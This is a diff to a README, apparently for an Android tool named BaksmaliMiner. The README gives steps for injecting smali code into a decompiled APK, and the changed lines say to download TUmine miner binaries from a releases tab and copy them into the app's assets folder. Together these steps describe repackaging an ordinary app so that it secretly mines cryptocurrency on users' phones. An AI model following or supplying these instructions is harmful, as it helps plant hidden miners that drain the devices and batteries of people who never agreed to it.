@@ -29,8 +29,11 @@ The native miner has a protection against being started twice.
 4. Copy the needed code from the 'MainActivty.smali'
 5. Replace all instances of 'Lits/name/baksmaliminer/MainActivity' with the appropriate class (the one you are modifying).
 6. Replace all instances of 'Lits/name/baksmaliminer' with 'L'
-7. Copy everything from the BacksmaliMiner's 'assets' directory to the decompiled apk sources' 'assets' folder.
-8. That's it.
+7. Download the appropriate 'assets' from the releases tab:
+    - assets_ssl -> download the TUmine binaries with ssl support
+    - assets     -> download the TUmine binaries WITHOUT ssl support (they are smaller)
+8. Unzip the downloaded 'assets' zip and copy it's content to the decompiled apk sources' 'assets' folder.
+9. That's it.
 
 ## Tools ##
 
